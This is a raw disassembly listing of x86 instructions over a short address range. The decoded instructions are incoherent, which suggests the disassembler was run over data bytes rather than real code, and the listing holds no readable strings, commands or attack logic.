  430628:	3c 18                	cmp    $0x18,%al
  43062a:	8c 6b 43             	mov    %gs,0x43(%ebx)
  43062d:	ba 9a 01 32 58       	mov    $0x5832019a,%edx
  430632:	38 5d a6             	cmp    %bl,-0x5a(%ebp)
  430635:	2a 36                	sub    (%esi),%dh
  430637:	f8                   	clc
  430638:	33 bc d6 39 32 f1 1b 	xor    0x1bf13239(%esi,%edx,8),%edi
  43063f:	5c                   	pop    %esp
  430640:	ad                   	lods   %ds:(%esi),%eax
  430641:	a1 a1 e0 cd bf       	mov    0xbfcde0a1,%eax
  430646:	9a a1 3c c9 86 c1 64 	lcall  $0x64c1,$0x86c93ca1
  43064d:	2f                   	das
  43064e:	24 6c                	and    $0x6c,%al
  430650:	08 31                	or     %dh,(%ecx)
  430652:	b6 56                	mov    $0x56,%dh
  430654:	c4 bf 24 37 dd 17    	les    0x17dd3724(%edi),%edi
  43065a:	40                   	inc    %eax
  43065b:	f7 4e 6d 48 40 88 56 	testl  $0x56884048,0x6d(%esi)
  430662:	2f                   	das
  430663:	4a                   	dec    %edx
  430664:	a3 47 b4 ed d9       	mov    %eax,0xd9edb447
  430669:	4c                   	dec    %esp
  43066a:	ed                   	in     (%dx),%eax
  43066b:	64 54                	fs push %esp
  43066d:	96                   	xchg   %eax,%esi
  43066e:	f2 ad                	repnz lods %ds:(%esi),%eax
  430670:	99                   	cltd
  430671:	ee                   	out    %al,(%dx)
  430672:	76 e7                	jbe    0x43065b
  430674:	cb                   	lret
  430675:	03 52 dd             	add    -0x23(%edx),%edx
  430678:	5c                   	pop    %esp
  430679:	db 98 f4 9e 97 91    	fistpl -0x6e68610c(%eax)
  43067f:	70 3f                	jo     0x4306c0
  430681:	bc 76 e3 89 dc       	mov    $0xdc89e376,%esp
  430686:	50                   	push   %eax
  430687:	86 5e a8             	xchg   %bl,-0x58(%esi)
  43068a:	46                   	inc    %esi
  43068b:	30 55 5e             	xor    %dl,0x5e(%ebp)
  43068e:	0f 05                	syscall
  430690:	22 34 c5 f2 08 59 d7 	and    -0x28a6f70e(,%eax,8),%dh
  430697:	31 bc 8e c5 ca c0 fd 	xor    %edi,-0x23f353b(%esi,%ecx,4)
  43069e:	7f 60                	jg     0x430700
  4306a0:	e5 e9                	in     $0xe9,%eax
  4306a2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4306a3:	b6 af                	mov    $0xaf,%dh
  4306a5:	9d                   	popf
  4306a6:	66 be 3a 52          	mov    $0x523a,%si
  4306aa:	cc                   	int3
  4306ab:	60                   	pusha
  4306ac:	91                   	xchg   %eax,%ecx
  4306ad:	78 35                	js     0x4306e4
  4306af:	9f                   	lahf
  4306b0:	13 17                	adc    (%edi),%edx
  4306b2:	a0 66 9f eb 86       	mov    0x86eb9f66,%al
  4306b7:	cc                   	int3
  4306b8:	ba 02 18 74 5c       	mov    $0x5c741802,%edx
  4306bd:	78 f1                	js     0x4306b0
  4306bf:	9b                   	fwait
  4306c0:	ba 00 10 ce 8a       	mov    $0x8ace1000,%edx
  4306c5:	59                   	pop    %ecx
  4306c6:	7f f0                	jg     0x4306b8
  4306c8:	66 a3 d6 5b a5 a5    	mov    %ax,0xa5a55bd6
  4306ce:	ee                   	out    %al,(%dx)
  4306cf:	98                   	cwtl
  4306d0:	1b 9b b8 f6 53 40    	sbb    0x4053f6b8(%ebx),%ebx
  4306d6:	1d a8 8b d9 47       	sbb    $0x47d98ba8,%eax
  4306db:	3f                   	aas
  4306dc:	d8 c6                	fadd   %st(6),%st
  4306de:	4e                   	dec    %esi
  4306df:	c2 d7 74             	ret    $0x74d7
  4306e2:	58                   	pop    %eax
  4306e3:	bc 43 31 2f 58       	mov    $0x582f3143,%esp
  4306e8:	e3 ff                	jecxz  0x4306e9
  4306ea:	4c                   	dec    %esp
  4306eb:	d7                   	xlat   %ds:(%ebx)
  4306ec:	30 06                	xor    %al,(%esi)
  4306ee:	d8 6c b5 9d          	fsubrs -0x63(%ebp,%esi,4)
  4306f2:	02 b9 0d b4 aa 49    	add    0x49aab40d(%ecx),%bh
  4306f8:	37                   	aaa
  4306f9:	92                   	xchg   %eax,%edx
  4306fa:	ba 62 c1 e0 79       	mov    $0x79e0c162,%edx
  4306ff:	ad                   	lods   %ds:(%esi),%eax
  430700:	3a c3                	cmp    %bl,%al
  430702:	22 b7 9a 1d cf 05    	and    0x5cf1d9a(%edi),%dh
  430708:	37                   	aaa
  430709:	12 8d c3 d1 55 fe    	adc    -0x1aa2e3d(%ebp),%cl
  43070f:	32 4e ea             	xor    -0x16(%esi),%cl
  430712:	39 7b fa             	cmp    %edi,-0x6(%ebx)
  430715:	13 8a 24 28 a2 08    	adc    0x8a22824(%edx),%ecx
  43071b:	62 96 b0 de c5 4a    	bound  %edx,0x4ac5deb0(%esi)
  430721:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  430722:	3a 9a 10 b7 b5 d7    	cmp    -0x284a48f0(%edx),%bl
  430728:	6b 76 51 cf          	imul   $0xffffffcf,0x51(%esi),%esi
  43072c:	cc                   	int3
  43072d:	9e                   	sahf
  43072e:	cd 9a                	int    $0x9a
  430730:	e5 13                	in     $0x13,%eax
  430732:	b6 b4                	mov    $0xb4,%dh
  430734:	91                   	xchg   %eax,%ecx
  430735:	6a fd                	push   $0xfffffffd
  430737:	d2 66 5d             	shlb   %cl,0x5d(%esi)
  43073a:	7d 7d                	jge    0x4307b9
  43073c:	38 95 d7 a4 49 b0    	cmp    %dl,-0x4fb65b29(%ebp)
  430742:	ec                   	in     (%dx),%al
  430743:	84 35 ee 53 b8 df    	test   %dh,0xdfb853ee
  430749:	76 c1                	jbe    0x43070c
  43074b:	b9 ad 1c df 7a       	mov    $0x7adf1cad,%ecx
  430750:	2f                   	das
  430751:	df 52 5e             	fists  0x5e(%edx)
  430754:	e4 99                	in     $0x99,%al
  430756:	0d 8b 51 e4 c2       	or     $0xc2e4518b,%eax
  43075b:	6d                   	insl   (%dx),%es:(%edi)
  43075c:	d3 b7 4c aa 79 1f    	shll   %cl,0x1f79aa4c(%edi)
  430762:	56                   	push   %esi
  430763:	dd c1                	ffree  %st(1)
  430765:	e0 db                	loopne 0x430742
  430767:	0b d4                	or     %esp,%edx
  430769:	2c 5d                	sub    $0x5d,%al
  43076b:	7c 81                	jl     0x4306ee
  43076d:	c4 78 46             	les    0x46(%eax),%edi
  430770:	00 61 08             	add    %ah,0x8(%ecx)
  430773:	ae                   	scas   %es:(%edi),%al
  430774:	01 5d 6e             	add    %ebx,0x6e(%ebp)
  430777:	ec                   	in     (%dx),%al
  430778:	af                   	scas   %es:(%edi),%eax
  430779:	cc                   	int3
  43077a:	ec                   	in     (%dx),%al
  43077b:	e7 54                	out    %eax,$0x54
  43077d:	dc 29                	fsubrl (%ecx)
  43077f:	c1 8a 5c be ba 80 d5 	rorl   $0xd5,-0x7f4541a4(%edx)
  430786:	87 4f d1             	xchg   %ecx,-0x2f(%edi)
  430789:	74 4c                	je     0x4307d7
  43078b:	a2 6f e9 2c 4b       	mov    %al,0x4b2ce96f
  430790:	06                   	push   %es
  430791:	30 43 3e             	xor    %al,0x3e(%ebx)
  430794:	07                   	pop    %es
  430795:	65 62 94 b9 6f a6 fc 	bound  %edx,%gs:-0x27035991(%ecx,%edi,4)
  43079c:	d8 
  43079d:	8b ac 15 a9 1c fe b5 	mov    -0x4a01e357(%ebp,%edx,1),%ebp
  4307a4:	0c 67                	or     $0x67,%al
  4307a6:	90                   	nop
  4307a7:	6c                   	insb   (%dx),%es:(%edi)
  4307a8:	eb 5c                	jmp    0x430806
  4307aa:	fd                   	std
  4307ab:	0d 1d da a3 f7       	or     $0xf7a3da1d,%eax
  4307b0:	ee                   	out    %al,(%dx)
  4307b1:	d7                   	xlat   %ds:(%ebx)
  4307b2:	dd fe                	(bad)
  4307b4:	2f                   	das
  4307b5:	23 55 13             	and    0x13(%ebp),%edx
  4307b8:	19 d8                	sbb    %ebx,%eax
  4307ba:	e8 44 c4 e0 24       	call   0x2523cc03
  4307bf:	96                   	xchg   %eax,%esi
  4307c0:	39 15 c4 78 55 11    	cmp    %edx,0x115578c4
  4307c6:	eb 30                	jmp    0x4307f8
  4307c8:	02 6e a5             	add    -0x5b(%esi),%ch
  4307cb:	91                   	xchg   %eax,%ecx
  4307cc:	fc                   	cld
  4307cd:	cc                   	int3
  4307ce:	b1 ce                	mov    $0xce,%cl
  4307d0:	2a 48 87             	sub    -0x79(%eax),%cl
  4307d3:	01 e4                	add    %esp,%esp
  4307d5:	4d                   	dec    %ebp
  4307d6:	95                   	xchg   %eax,%ebp
  4307d7:	fc                   	cld
  4307d8:	7b dc                	jnp    0x4307b6
  4307da:	dd 11                	fstl   (%ecx)
  4307dc:	ea d8 44 49 16 53 9f 	ljmp   $0x9f53,$0x164944d8
  4307e3:	c2 6d 28             	ret    $0x286d
  4307e6:	62 bf 16 26 68 de    	bound  %edi,-0x2197d9ea(%edi)
  4307ec:	80 d2 10             	adc    $0x10,%dl
  4307ef:	b8 ed 13 2a 82       	mov    $0x822a13ed,%eax
  4307f4:	e0 f4                	loopne 0x4307ea
  4307f6:	ed                   	in     (%dx),%eax
  4307f7:	a2 97 1e c0 8c       	mov    %al,0x8cc01e97
  4307fc:	f1                   	int1
  4307fd:	f3 af                	repz scas %es:(%edi),%eax
  4307ff:	2f                   	das
  430800:	8d 4e 0f             	lea    0xf(%esi),%ecx
  430803:	40                   	inc    %eax
  430804:	f4                   	hlt
  430805:	b3 46                	mov    $0x46,%bl
  430807:	b2 07                	mov    $0x7,%dl
  430809:	ea 84 6d 58 e9 67 89 	ljmp   $0x8967,$0xe9586d84
  430810:	43                   	inc    %ebx
  430811:	ed                   	in     (%dx),%eax
  430812:	f1                   	int1
  430813:	16                   	push   %ss
  430814:	aa                   	stos   %al,%es:(%edi)
  430815:	a3 29 57 21 4b       	mov    %eax,0x4b215729
  43081a:	08 27                	or     %ah,(%edi)
  43081c:	66 98                	cbtw
  43081e:	a0 4b 2a ee 92       	mov    0x92ee2a4b,%al
  430823:	6c                   	insb   (%dx),%es:(%edi)
  430824:	44                   	inc    %esp
  430825:	3e da c4             	ds fcmovb %st(4),%st
  430828:	30 4d 80             	xor    %cl,-0x80(%ebp)
  43082b:	50                   	push   %eax
  43082c:	83 6d 24 e3          	subl   $0xffffffe3,0x24(%ebp)
  430830:	b8 4c 18 9f 28       	mov    $0x289f184c,%eax
  430835:	f6 ff                	idiv   %bh
  430837:	a3 bf 96 77 5b       	mov    %eax,0x5b7796bf
  43083c:	43                   	inc    %ebx
  43083d:	ba 34 31 5c 0e       	mov    $0xe5c3134,%edx
  430842:	11 6e 3b             	adc    %ebp,0x3b(%esi)
  430845:	88 32                	mov    %dh,(%edx)
  430847:	a0 51 27 38 4d       	mov    0x4d382751,%al
  43084c:	57                   	push   %edi
  43084d:	f5                   	cmc
  43084e:	5f                   	pop    %edi
  43084f:	13 45 ed             	adc    -0x13(%ebp),%eax
  430852:	0c d1                	or     $0xd1,%al
  430854:	ee                   	out    %al,(%dx)
  430855:	89 f9                	mov    %edi,%ecx
  430857:	e6 33                	out    %al,$0x33
  430859:	76 ac                	jbe    0x430807
  43085b:	7a ab                	jp     0x430808
  43085d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43085e:	fb                   	sti
  43085f:	5e                   	pop    %esi
  430860:	65 43                	gs inc %ebx
  430862:	d3 a2 85 80 63 a7    	shll   %cl,-0x589c7f7b(%edx)
  430868:	fe                   	(bad)
  430869:	3a ce                	cmp    %dh,%cl
  43086b:	d3 03                	roll   %cl,(%ebx)
  43086d:	e1 65                	loope  0x4308d4
  43086f:	bd 7e 11 cc 24       	mov    $0x24cc117e,%ebp
  430874:	7e ba                	jle    0x430830
  430876:	c3                   	ret
  430877:	0c f7                	or     $0xf7,%al
  430879:	8b f3                	mov    %ebx,%esi
  43087b:	9a cf 3f 20 f0 21 26 	lcall  $0x2621,$0xf0203fcf
  430882:	b4 b0                	mov    $0xb0,%ah
  430884:	32 b7 df cf 14 b3    	xor    -0x4ceb3021(%edi),%dh
  43088a:	a3 80 07 fe 42       	mov    %eax,0x42fe0780
  43088f:	02 be e5 5d cd 84    	add    -0x7b32a21b(%esi),%bh
  430895:	aa                   	stos   %al,%es:(%edi)
  430896:	4c                   	dec    %esp
  430897:	de 77 94             	fidivs -0x6c(%edi)
  43089a:	fe 86 6f 5c 80 73    	incb   0x73805c6f(%esi)
  4308a0:	e9 2e 2b e1 51       	jmp    0x522433d3
  4308a5:	71 c0                	jno    0x430867
  4308a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4308a8:	85 70 27             	test   %esi,0x27(%eax)
  4308ab:	86 86 09 79 f8 b0    	xchg   %al,-0x4f0786f7(%esi)
  4308b1:	e9 80 4b 2a 48       	jmp    0x486d5436
  4308b6:	04 e6                	add    $0xe6,%al
  4308b8:	70 c8                	jo     0x430882
  4308ba:	68 9f b5 12 4b       	push   $0x4b12b59f
  4308bf:	e5 9d                	in     $0x9d,%eax
  4308c1:	40                   	inc    %eax
  4308c2:	ac                   	lods   %ds:(%esi),%al
  4308c3:	bf 41 9c 1d 28       	mov    $0x281d9c41,%edi
  4308c8:	62 64 cf d7          	bound  %esp,-0x29(%edi,%ecx,8)
  4308cc:	86 2d 1a a9 00 1e    	xchg   %ch,0x1e00a91a
  4308d2:	b1 55                	mov    $0x55,%cl
  4308d4:	98                   	cwtl
  4308d5:	2d 51 2e e6 4f       	sub    $0x4fe62e51,%eax
  4308da:	02 18                	add    (%eax),%bl
  4308dc:	f1                   	int1
  4308dd:	11 c7                	adc    %eax,%edi
  4308df:	54                   	push   %esp
  4308e0:	41                   	inc    %ecx
  4308e1:	7d 7e                	jge    0x430961
  4308e3:	02 4b 23             	add    0x23(%ebx),%cl
  4308e6:	16                   	push   %ss
  4308e7:	f1                   	int1
  4308e8:	23 60 d4             	and    -0x2c(%eax),%esp
  4308eb:	2f                   	das
  4308ec:	2d 4a 20 df e5       	sub    $0xe5df204a,%eax
  4308f1:	d9 4c 69 2c          	(bad) 0x2c(%ecx,%ebp,2)
  4308f5:	35 f6 68 66 09       	xor    $0x96668f6,%eax
  4308fa:	ea 10 0a 0d 48 2d 13 	ljmp   $0x132d,$0x480d0a10
  430901:	b5 70                	mov    $0x70,%ch
  430903:	6d                   	insl   (%dx),%es:(%edi)
  430904:	bb 04 71 33 e7       	mov    $0xe7337104,%ebx
  430909:	36 10 23             	adc    %ah,%ss:(%ebx)
  43090c:	5b                   	pop    %ebx
  43090d:	03 34 17             	add    (%edi,%edx,1),%esi
  430910:	42                   	inc    %edx
  430911:	09 e1                	or     %esp,%ecx
  430913:	02 f8                	add    %al,%bh
  430915:	d8 2d 2b 98 26 7a    	fsubrs 0x7a26982b
  43091b:	be c5 ed de 8a       	mov    $0x8adeedc5,%esi
  430920:	99                   	cltd
  430921:	5c                   	pop    %esp
  430922:	2d 3d 1d a7 af       	sub    $0xafa71d3d,%eax
  430927:	a2 39 a9 38 f2       	mov    %al,0xf238a939
  43092c:	4b                   	dec    %ebx
  43092d:	e0 c6                	loopne 0x4308f5
  43092f:	84 d3                	test   %dl,%bl
  430931:	8d a8 b4 33 c4 83    	lea    -0x7c3bcc4c(%eax),%ebp
  430937:	fa                   	cli
  430938:	1c 2b                	sbb    $0x2b,%al
  43093a:	0d 16 ff 97 74       	or     $0x7497ff16,%eax
  43093f:	dd 80 a3 07 ae 98    	fldl   -0x6751f85d(%eax)
  430945:	3a 20                	cmp    (%eax),%ah
  430947:	7b d5                	jnp    0x43091e
  430949:	67 f2 f8             	addr16 repnz clc
  43094c:	9d                   	popf
  43094d:	18 b4 da fe c4 3c 09 	sbb    %dh,0x93cc4fe(%edx,%ebx,8)
  430954:	76 19                	jbe    0x43096f
  430956:	14 e6                	adc    $0xe6,%al
  430958:	de 55 dc             	ficoms -0x24(%ebp)
  43095b:	ac                   	lods   %ds:(%esi),%al
  43095c:	6e                   	outsb  %ds:(%esi),(%dx)
  43095d:	cd 5c                	int    $0x5c
  43095f:	c8 5b de 41          	enter  $0xde5b,$0x41
  430963:	a2 5e 44 59 d8       	mov    %al,0xd859445e
  430968:	cb                   	lret
  430969:	73 49                	jae    0x4309b4
  43096b:	13 e5                	adc    %ebp,%esp
  43096d:	32 d3                	xor    %bl,%dl
  43096f:	58                   	pop    %eax
  430970:	61                   	popa
  430971:	df 41 ed             	filds  -0x13(%ecx)
  430974:	fb                   	sti
  430975:	a1 43 5d 32 72       	mov    0x72325d43,%eax
  43097a:	72 78                	jb     0x4309f4
  43097c:	30 d0                	xor    %dl,%al
  43097e:	d9 70 da             	fnstenv -0x26(%eax)
  430981:	c2 83 bc             	ret    $0xbc83
  430984:	96                   	xchg   %eax,%esi
  430985:	24 0e                	and    $0xe,%al
  430987:	f6 4b 9e e9          	testb  $0xe9,-0x62(%ebx)
  43098b:	0a f6                	or     %dh,%dh
  43098d:	a0 6d f4 9a 81       	mov    0x819af46d,%al
  430992:	3a a2 59 1e 7f 45    	cmp    0x457f1e59(%edx),%ah
  430998:	3a a3 46 cb 17 37    	cmp    0x3717cb46(%ebx),%ah
  43099e:	51                   	push   %ecx
  43099f:	e0 98                	loopne 0x430939
  4309a1:	68 50 81 75 7f       	push   $0x7f758150
  4309a6:	24 95                	and    $0x95,%al
  4309a8:	ca a7 ed             	lret   $0xeda7
  4309ab:	d2 46 4c             	rolb   %cl,0x4c(%esi)
  4309ae:	9f                   	lahf
  4309af:	ea 4d 5b 7e 4d 05 07 	ljmp   $0x705,$0x4d7e5b4d
  4309b6:	62 b6 6e fe aa 9f    	bound  %esi,-0x60550192(%esi)
  4309bc:	08 79 6a             	or     %bh,0x6a(%ecx)
  4309bf:	24 69                	and    $0x69,%al
  4309c1:	3a 24 0d 69 d9 5e 41 	cmp    0x415ed969(,%ecx,1),%ah
  4309c8:	d1 6b f5             	shrl   $1,-0xb(%ebx)
  4309cb:	2d a8 a9 ce 97       	sub    $0x97cea9a8,%eax
  4309d0:	9b                   	fwait
  4309d1:	28 9e 36 ef 9e 3e    	sub    %bl,0x3e9eef36(%esi)
  4309d7:	81 0f df cb 24 11    	orl    $0x1124cbdf,(%edi)
  4309dd:	4c                   	dec    %esp
  4309de:	9b                   	fwait
  4309df:	8e 02                	mov    (%edx),%es
  4309e1:	e7 85                	out    %eax,$0x85
  4309e3:	ed                   	in     (%dx),%eax
  4309e4:	1d b4 41 aa b3       	sbb    $0xb3aa41b4,%eax
  4309e9:	b3 54                	mov    $0x54,%bl
  4309eb:	d0 a1 b7 e2 b4 2a    	shlb   $1,0x2ab4e2b7(%ecx)
  4309f1:	f2 58                	repnz pop %eax
  4309f3:	a8 35                	test   $0x35,%al
  4309f5:	e0 84                	loopne 0x43097b
  4309f7:	27                   	daa
  4309f8:	9f                   	lahf
  4309f9:	78 ce                	js     0x4309c9
  4309fb:	26 92                	es xchg %eax,%edx
  4309fd:	df 90 63 ed 9a fe    	fists  -0x165129d(%eax)
  430a03:	6f                   	outsl  %ds:(%esi),(%dx)
  430a04:	ff 64 b5 66          	jmp    *0x66(%ebp,%esi,4)
  430a08:	0f 43 37             	cmovae (%edi),%esi
  430a0b:	0b 93 fe 99 9a c1    	or     -0x3e656602(%ebx),%edx
  430a11:	95                   	xchg   %eax,%ebp
  430a12:	8a c5                	mov    %ch,%al
  430a14:	cf                   	iret
  430a15:	c1 23 37             	shll   $0x37,(%ebx)
  430a18:	bf 85 b3 5f d4       	mov    $0xd45fb385,%edi
  430a1d:	e5 1d                	in     $0x1d,%eax
  430a1f:	e9 31 3b 2d 92       	jmp    0x92704555
  430a24:	92                   	xchg   %eax,%edx
  430a25:	39 fd                	cmp    %edi,%ebp
  430a27:	2c 37                	sub    $0x37,%al
  430a29:	5b                   	pop    %ebx
  430a2a:	22 f3                	and    %bl,%dh
  430a2c:	7e 15                	jle    0x430a43
  430a2e:	71 7d                	jno    0x430aad
  430a30:	cd f5                	int    $0xf5
  430a32:	ef                   	out    %eax,(%dx)
  430a33:	ae                   	scas   %es:(%edi),%al
  430a34:	8e 1e                	mov    (%esi),%ds
  430a36:	c2 a4 70             	ret    $0x70a4
  430a39:	14 83                	adc    $0x83,%al
  430a3b:	63 5e 06             	arpl   %ebx,0x6(%esi)
  430a3e:	74 a6                	je     0x4309e6
  430a40:	0e                   	push   %cs
  430a41:	b8 e2 60 90 89       	mov    $0x899060e2,%eax
  430a46:	27                   	daa
  430a47:	5d                   	pop    %ebp
  430a48:	9b                   	fwait
  430a49:	46                   	inc    %esi
  430a4a:	26 c9                	es leave
  430a4c:	8c 53 38             	mov    %ss,0x38(%ebx)
  430a4f:	28 55 b8             	sub    %dl,-0x48(%ebp)
  430a52:	46                   	inc    %esi
  430a53:	9a bd d4 9b c7 da c3 	lcall  $0xc3da,$0xc79bd4bd
  430a5a:	95                   	xchg   %eax,%ebp
  430a5b:	b2 9d                	mov    $0x9d,%dl
  430a5d:	5f                   	pop    %edi
  430a5e:	08 f1                	or     %dh,%cl
  430a60:	42                   	inc    %edx
  430a61:	73 39                	jae    0x430a9c
  430a63:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430a64:	91                   	xchg   %eax,%ecx
  430a65:	04 07                	add    $0x7,%al
  430a67:	7f 05                	jg     0x430a6e
  430a69:	63 e6                	arpl   %esp,%esi
  430a6b:	d9 ab e2 a9 59 02    	fldcw  0x259a9e2(%ebx)
  430a71:	c5 ea be             	(bad)
  430a74:	38 5c a2 f9          	cmp    %bl,-0x7(%edx,%eiz,4)
  430a78:	82 00 f2             	addb   $0xf2,(%eax)
  430a7b:	77 cd                	ja     0x430a4a
  430a7d:	74 df                	je     0x430a5e
  430a7f:	bc b8 09 aa 0a       	mov    $0xaaa09b8,%esp
  430a84:	df 17                	fists  (%edi)
  430a86:	33 8f 63 db 10 d9    	xor    -0x26ef249d(%edi),%ecx
  430a8c:	21 cb                	and    %ecx,%ebx
  430a8e:	cf                   	iret
  430a8f:	5a                   	pop    %edx
  430a90:	62 9e ab 22 f5 63    	bound  %ebx,0x63f522ab(%esi)
  430a96:	68 35 19 e9 89       	push   $0x89e91935
  430a9b:	8c 35 ff 6f 3a a5    	mov    %?,0xa53a6fff
  430aa1:	8e 66 15             	mov    0x15(%esi),%fs
  430aa4:	f4                   	hlt
  430aa5:	7f 98                	jg     0x430a3f
  430aa7:	b8 97 da 9a 24       	mov    $0x249ada97,%eax
  430aac:	65 d0 a7 a8 09 ac ff 	shlb   $1,%gs:-0x53f658(%edi)
  430ab3:	99                   	cltd
  430ab4:	93                   	xchg   %eax,%ebx
  430ab5:	86 f8                	xchg   %bh,%al
  430ab7:	16                   	push   %ss
  430ab8:	fb                   	sti
  430ab9:	a0 b6 24 24 77       	mov    0x772424b6,%al
  430abe:	84 48 cd             	test   %cl,-0x33(%eax)
  430ac1:	eb 02                	jmp    0x430ac5
  430ac3:	54                   	push   %esp
  430ac4:	22 31                	and    (%ecx),%dh
  430ac6:	e2 1d                	loop   0x430ae5
  430ac8:	d6                   	salc
  430ac9:	4e                   	dec    %esi
  430aca:	5a                   	pop    %edx
  430acb:	a2 df d5 d9 b5       	mov    %al,0xb5d9d5df
  430ad0:	53                   	push   %ebx
  430ad1:	b7 7d                	mov    $0x7d,%bh
  430ad3:	4b                   	dec    %ebx
  430ad4:	64 85 2b             	test   %ebp,%fs:(%ebx)
  430ad7:	46                   	inc    %esi
  430ad8:	bf 11 fa af cb       	mov    $0xcbaffa11,%edi
  430add:	94                   	xchg   %eax,%esp
  430ade:	ab                   	stos   %eax,%es:(%edi)
  430adf:	cb                   	lret
  430ae0:	ce                   	into
  430ae1:	8d 27                	lea    (%edi),%esp
  430ae3:	61                   	popa
  430ae4:	c4 59 1e             	les    0x1e(%ecx),%ebx
  430ae7:	08 b6 b6 a4 3d 24    	or     %dh,0x243da4b6(%esi)
  430aed:	17                   	pop    %ss
  430aee:	66 20 c6             	data16 and %al,%dh
  430af1:	a0 0b 79 f5 87       	mov    0x87f5790b,%al
  430af6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430af7:	34 4a                	xor    $0x4a,%al
  430af9:	34 ea                	xor    $0xea,%al
  430afb:	a3 13 c1 93 b7       	mov    %eax,0xb793c113
  430b00:	c8 f6 3b 8a          	enter  $0x3bf6,$0x8a
  430b04:	5e                   	pop    %esi
  430b05:	a3 22 80 d7 a2       	mov    %eax,0xa2d78022
  430b0a:	03 0f                	add    (%edi),%ecx
  430b0c:	d5 c9                	aad    $0xc9
  430b0e:	07                   	pop    %es
  430b0f:	31 d9                	xor    %ebx,%ecx
  430b11:	f9                   	stc
  430b12:	ba b5 78 bd 0a       	mov    $0xabd78b5,%edx
  430b17:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  430b18:	0f ce                	bswap  %esi
  430b1a:	b6 63                	mov    $0x63,%dh
  430b1c:	29 8f cb 33 fe bf    	sub    %ecx,-0x4001cc35(%edi)
  430b22:	70 a9                	jo     0x430acd
  430b24:	e0 40                	loopne 0x430b66
  430b26:	aa                   	stos   %al,%es:(%edi)
  430b27:	52                   	push   %edx
  430b28:	03 ac 05 ed 33 cf 4b 	add    0x4bcf33ed(%ebp,%eax,1),%ebp
  430b2f:	bb 8c aa 13 80       	mov    $0x8013aa8c,%ebx
  430b34:	64 c6                	fs (bad)
  430b36:	31 dd                	xor    %ebx,%ebp
  430b38:	f1                   	int1
  430b39:	91                   	xchg   %eax,%ecx
  430b3a:	74 7e                	je     0x430bba
  430b3c:	53                   	push   %ebx
  430b3d:	3c df                	cmp    $0xdf,%al
  430b3f:	45                   	inc    %ebp
  430b40:	5b                   	pop    %ebx
  430b41:	61                   	popa
  430b42:	0b 38                	or     (%eax),%edi
  430b44:	c7                   	(bad)
  430b45:	a1 0b 6d 2a 19       	mov    0x192a6d0b,%eax
  430b4a:	ac                   	lods   %ds:(%esi),%al
  430b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  430b4c:	ab                   	stos   %eax,%es:(%edi)
  430b4d:	da 38                	fidivrl (%eax)
  430b4f:	c0 36 d9             	shlb   $0xd9,(%esi)
  430b52:	58                   	pop    %eax
  430b53:	78 03                	js     0x430b58
  430b55:	9e                   	sahf
  430b56:	d9 ae d8 b2 a5 6d    	fldcw  0x6da5b2d8(%esi)
  430b5c:	14 ba                	adc    $0xba,%al
  430b5e:	db 9c 61 e4 3e fb 7f 	fistpl 0x7ffb3ee4(%ecx,%eiz,2)
  430b65:	23 6f 6f             	and    0x6f(%edi),%ebp
  430b68:	1b 2d dc fe ef b0    	sbb    0xb0effedc,%ebp
  430b6e:	5e                   	pop    %esi
  430b6f:	e9 06 83 87 cb       	jmp    0xcbca8e7a
  430b74:	b6 6d                	mov    $0x6d,%dh
  430b76:	d6                   	salc
  430b77:	b1 95                	mov    $0x95,%cl
  430b79:	7e 29                	jle    0x430ba4
  430b7b:	be 69 74 0d 1d       	mov    $0x1d0d7469,%esi
  430b80:	c4                   	(bad)
  430b81:	d1 8d 76 d7 0a 53    	rorl   $1,0x530ad776(%ebp)
  430b87:	6d                   	insl   (%dx),%es:(%edi)
  430b88:	2c 10                	sub    $0x10,%al
  430b8a:	e2 5d                	loop   0x430be9
  430b8c:	48                   	dec    %eax
  430b8d:	8f                   	(bad)
  430b8e:	a2 c8 5a 75 15       	mov    %al,0x15755ac8
  430b93:	e1 3b                	loope  0x430bd0
  430b95:	07                   	pop    %es
  430b96:	2b 70 f6             	sub    -0xa(%eax),%esi
  430b99:	7d f6                	jge    0x430b91
  430b9b:	44                   	inc    %esp
  430b9c:	b3 87                	mov    $0x87,%bl
  430b9e:	b1 ab                	mov    $0xab,%cl
  430ba0:	92                   	xchg   %eax,%edx
  430ba1:	b0 80                	mov    $0x80,%al
  430ba3:	16                   	push   %ss
  430ba4:	81 f9 3b 8c 9b ed    	cmp    $0xed9b8c3b,%ecx
  430baa:	f8                   	clc
  430bab:	6c                   	insb   (%dx),%es:(%edi)
  430bac:	46                   	inc    %esi
  430bad:	8c a7 7b 71 be 3e    	mov    %fs,0x3ebe717b(%edi)
  430bb3:	7c a2                	jl     0x430b57
  430bb5:	b9 04 f3 92 93       	mov    $0x9392f304,%ecx
  430bba:	92                   	xchg   %eax,%edx
  430bbb:	f6 60 ec             	mulb   -0x14(%eax)
  430bbe:	73 ca                	jae    0x430b8a
  430bc0:	77 55                	ja     0x430c17
  430bc2:	29 59 ec             	sub    %ebx,-0x14(%ecx)
  430bc5:	f0 ae                	lock scas %es:(%edi),%al
  430bc7:	98                   	cwtl
  430bc8:	ee                   	out    %al,(%dx)
  430bc9:	fb                   	sti
  430bca:	1d 3b 52 2b df       	sbb    $0xdf2b523b,%eax
  430bcf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  430bd0:	f6 ef                	imul   %bh
  430bd2:	10 17                	adc    %dl,(%edi)
  430bd4:	ed                   	in     (%dx),%eax
  430bd5:	24 8f                	and    $0x8f,%al
  430bd7:	6a 6b                	push   $0x6b
  430bd9:	10 31                	adc    %dh,(%ecx)
  430bdb:	e5 75                	in     $0x75,%eax
  430bdd:	fc                   	cld
  430bde:	4a                   	dec    %edx
  430bdf:	a1 24 b8 8f e8       	mov    0xe88fb824,%eax
  430be4:	e6 a7                	out    %al,$0xa7
  430be6:	b9 a0 6c 2e 28       	mov    $0x282e6ca0,%ecx
  430beb:	15 97 54 0c ba       	adc    $0xba0c5497,%eax
  430bf0:	be 1a d0 ce fe       	mov    $0xfeced01a,%esi
  430bf5:	e3 13                	jecxz  0x430c0a
  430bf7:	73 ed                	jae    0x430be6
  430bf9:	0e                   	push   %cs
  430bfa:	2b 14 dc             	sub    (%esp,%ebx,8),%edx
  430bfd:	2c 26                	sub    $0x26,%al
